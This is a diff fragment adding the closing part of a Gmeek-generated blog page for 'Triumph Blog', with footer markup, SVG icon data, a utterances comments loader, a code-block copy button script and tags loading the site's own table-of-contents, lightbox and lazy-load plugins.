+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Triumph Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1umph.top/plugins/TOC.js'></script><script src='https://7r1umph.top/plugins/lightbox.js'></script><script src='https://7r1umph.top/plugins/LazyLoadImages.js'></script>
+
+</html>
